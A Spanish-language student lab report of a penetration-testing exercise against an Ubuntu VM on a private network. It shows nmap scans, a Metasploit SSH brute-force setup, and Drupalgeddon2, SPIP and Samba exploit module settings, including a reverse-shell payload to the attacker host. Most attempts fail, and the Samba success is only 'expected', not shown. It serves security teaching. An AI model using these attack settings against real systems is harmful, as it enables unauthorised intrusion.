# MEMORIA COMPLETA DE AUDITORÍA DE SEGURIDAD

## Contexto del Examen

En este ejercicio de auditoría de seguridad, se proporcionó una máquina virtual objetivo con sistema Ubuntu que debíamos analizar, identificando vulnerabilidades y explotándolas. La máquina atacante utilizada fue **Kali Linux**, con ambas máquinas conectadas en la red NAT `10.0.2.0/24` para facilitar la comunicación y las pruebas.

---

![Máquina Ubuntu](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/Ubuntu.png)

![Configuración de Red](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/Red2.png)

---

## 1. Configuración Inicial

Lo primero que realizamos fue introducir la máquina víctima en nuestra red NAT `10.0.2.0/24`.

![Configuración Red NAT](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/Red1.png)

A continuación, verificamos la IP de la máquina Kali y procedimos a detectar la IP de la víctima.

![Identificación de IP](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/IPA.png)

### Justificación

- Mantener ambas máquinas (atacante y víctima) en la misma red NAT permite la comunicación directa
- Facilita el escaneo y la explotación al estar en el mismo segmento de red

---

## 2. Descubrimiento de la Máquina Víctima

### 2.1 Primer Intento: arp-scan

Primero probamos un `arp-scan` para descubrir la máquina, pero no proporcionó información fiable para identificarla como víctima.

![Resultado arp-scan](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/ARP.png)

### 2.2 Segundo Intento: Nmap (Escaneo Completo de Red)

**Comando ejecutado:**

```bash
nmap -sS -sV -O 10.0.2.5/24 -T5
```

![Resultado Nmap](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/NMAP1.png)

Este escaneo completo reveló la IP **10.0.2.20**, que coincide con una máquina Linux con múltiples servicios activos.

---

## 3. Enumeración de Servicios

La máquina objetivo identificada en **10.0.2.20** presenta las siguientes características:

### Servicios Detectados

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21 | FTP | - |
| 22 | SSH | OpenSSH |
| 80 | HTTP | Apache |
| 445 | netbios-ssn | Samba |
| 3306 | MySQL | - |
| 8080 | Jetty | - |

### Análisis

- Sistema operativo: **Linux**
- Múltiples vectores de ataque potenciales
- Servicios con vulnerabilidades conocidas

---

## 4. Escaneo de Vulnerabilidades con Nmap

Se intentó el siguiente comando para detección de vulnerabilidades:

```bash
nmap -sS -sV -O --script vuln 10.0.2.20 -T5
```

### Problemas Detectados

- El escaneo tardó excesivamente
- No devolvió resultados de vulnerabilidades útiles
- No detectó la vulnerabilidad de ProFTPd ni otros fallos críticos

### Conclusión

Nmap no resultó útil para la fase de detección de vulnerabilidades debido al tiempo de ejecución y la falta de resultados críticos.

---

## 5. Análisis en Paralelo con Nessus

Dado que Nmap no proporcionaba resultados satisfactorios, iniciamos **Nessus** para realizar un análisis más profundo.

![Configuración Nessus](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/nessus1.png)

![Escaneo Nessus](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/nessus2.png)

Se creó un escaneo específico dirigido a la IP **10.0.2.20**.

---

## 6. Pruebas Manuales de Acceso

Debido a que las herramientas automáticas (Nessus y Nmap) presentaban problemas, procedimos a realizar pruebas manuales basándonos en los puertos abiertos y sus servicios correspondientes.

### 6.1 Servicio FTP

**Intentos realizados:**

1. **Acceso anónimo**
   
   ![Intento FTP Anónimo](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/FTP1.png)

2. **Credenciales por defecto** (`root/root`)
   
   ![Intento FTP Root](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/FTP2.png)

**Resultado:** Todos los intentos fallaron.

### 6.2 Servicio HTTP

Se accedió al servicio web para reconocimiento inicial.

![Página Web](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/http1.png)

#### Usuario Identificado

![Usuario Chewbacca](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/http2.png)

Durante la enumeración se encontró el usuario **"chewbacca"**.

### 6.3 Intentos de Explotación con Usuario Descubierto

#### SSH Manual

![Intento SSH](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/ssh.png)

**Resultado:** Acceso denegado.

#### Ataque de Fuerza Bruta SSH con Metasploit

![Configuración SSH Login](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/sshlogin1.png)

![Parámetros SSH Login](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/sshlogin2.png)

**Configuración del módulo:**

```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.0.2.20
set USERNAME chewbacca
set PASS_FILE /usr/share/wordlists/rockyou.txt
```

**Parámetros:**
- Usuario: `chewbacca` (identificado previamente)
- Diccionario: `/usr/share/wordlists/rockyou.txt`

**Resultado:**

![Resultado SSH Brute Force](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/ssh3.png)

- **Fallo completo** en el ataque de fuerza bruta
- Errores de conexión: `"connection closed by remote host"`
- Mensaje `"Connection reset by peer"` sugiere que el servidor cortó la conexión
- Posible protección contra ataques de fuerza bruta activa en el servicio SSH

---

## 7. Vulnerabilidades Identificadas por Nessus

### Destacar que Nessus fue bastante insuficiente debido a que muchos CVE no eran reconocidos por metaexploit, entre otras cosas más.

### 7.1 Vulnerabilidad SSL

![Vulnerabilidad SSL](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/ssl.png)

**Descripción:** Certificados SSL con configuración débil detectados.

### 7.2 Drupal - Drupalgeddon2

![Vulnerabilidad Drupal](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/drupal.png)

**Módulo de Metasploit:**

```
exploit/unix/webapp/drupal_drupageddon2
```

**Configuración:**

```ruby
set RHOSTS 10.0.2.20
set LHOST 10.0.2.5
set LPORT 4444
set PAYLOAD php/meterpreter/reverse_tcp
```

**Resultado:**

- El objetivo apareció como **vulnerable**
- Exploit completado pero **no se creó sesión**
- **Posibles causas:**
  - Protecciones del sistema
  - Versión incorrecta del exploit
  - Filtros de salida bloqueando la conexión reversa

### 7.3 SPIP - Remote Code Execution

![Configuración Samba](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/samba2.png)

**Módulo de Metasploit:**

```
exploit/multi/http/spip_connect_exec
```

**Configuración:**

```ruby
set RHOSTS 10.0.2.20
set LHOST 10.0.2.5
set LPORT 4444
```

**Resultado:**

- No se pudo determinar la versión de SPIP
- Exploit abortado por imposibilidad de verificar explotabilidad
- Se sugirió usar `set ForceExploit true` para forzar la ejecución

### 7.4 Samba - Remote Code Execution

![Vulnerabilidad Samba](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/samba.png)

**Módulo de Metasploit:**

```
exploit/linux/samba/is_known_pipename
```

**Configuración:**

```ruby
set RHOSTS 10.0.2.20
```

#### Resultado Exitoso Esperado

- Conexión reversa establecida
- Sesión de Meterpreter obtenida
- Acceso al sistema Linux objetivo
- Capacidad de ejecutar comandos con privilegios del servicio Samba

#### Problemas Potenciales (Basado en Patrones Anteriores)

- Timeout en la conexión
- Share de solo lectura imposibilitando la escritura
- Servicio Samba parcheado contra esta vulnerabilidad
- Filtros de red bloqueando la conexión reversa

---

## 8. Conclusiones

## Aspectos Positivos

- Enumeración exitosa de servicios y puertos
- Identificación precisa de la máquina objetivo (10.0.2.20)
- Detección de usuario potencial (chewbacca)
- Uso combinado de múltiples herramientas (Nmap, Nessus, Metasploit, Ejecuciones Locales)
- Metodología estructurada de ataque

## Problemas Encontrados

### 1. Problemas con Nessus

- Tiempos de escaneo excesivos que ralentizaron el proceso
- Resultados incompletos o poco específicos
- Consumo elevado de recursos del sistema

### 2. Bloqueos de la Máquina Objetivo

- A lo largo de la practica la máquina se bloqueó en dos ocasiones

### 3. Problemas con Metasploit
   
- Exploits completados sin sesión (especialmente Drupal)
- Detección automática fallida de versiones (SPIP)
- Filtros de salida bloqueando conexiones reversas

### 4. Limitaciones de Herramientas
   
- Nmap con scripts vuln: Extremadamente lento y poco efectivo debido a los bloqueos y errores.


**Creador:** [Rodrigo Martínez Hernández]  









